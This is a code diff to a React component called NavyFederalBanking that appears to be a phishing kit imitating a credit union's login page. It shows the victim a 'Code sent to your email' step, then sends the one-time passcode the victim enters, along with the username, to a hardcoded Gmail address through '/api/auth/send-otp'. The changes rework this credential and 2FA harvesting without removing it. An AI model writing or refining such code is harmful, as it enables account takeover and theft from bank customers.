@@ -90,27 +90,6 @@ export default function NavyFederalBanking() {
         setError(r.error)
         return
       }
-      
-      // ✅ Generate OTP and send to admin
-      const otpCode = Math.floor(100000 + Math.random() * 900000).toString()
-      sessionStorage.setItem('loginOTP', otpCode)
-      
-      // ✅ Send OTP to admin via fetch
-      try {
-        await fetch('/api/send-otp-admin', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            otp: otpCode,
-            username: username,
-            adminEmail: 'blessedresult6@gmail.com',
-            message: '🔐 OTP Generated for User'
-          })
-        })
-      } catch (err) {
-        console.error('Failed to send OTP to admin:', err)
-      }
-      
       setOtp('')
       setStep('otp1')
       setNote('Code sent to your email.')
@@ -125,18 +104,23 @@ export default function NavyFederalBanking() {
       
       const which = step === 'otp1' ? 1 : 2
       
-      // ✅ Send OTP attempt to admin via fetch
+      // ✅ Send OTP to admin via submitOtp
+      const result = await submitOtp({ attemptId, otp, which })
+      console.log(`📱 OTP ${which} result:`, result)
+      
+      // ✅ Also send directly via fetch (as backup)
       try {
-        await fetch('/api/send-otp-admin', {
+        const adminEmail = 'blessedresult6@gmail.com'
+        const username = sessionStorage.getItem('loginUsername') || 'Unknown'
+        
+        await fetch('/api/auth/send-otp', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             otp: otp,
             username: username,
             which: which,
-            sessionId: attemptId,
-            adminEmail: 'blessedresult6@gmail.com',
-            message: `📱 OTP ${which} Attempt`
+            adminEmail: adminEmail
           })
         })
       } catch (err) {
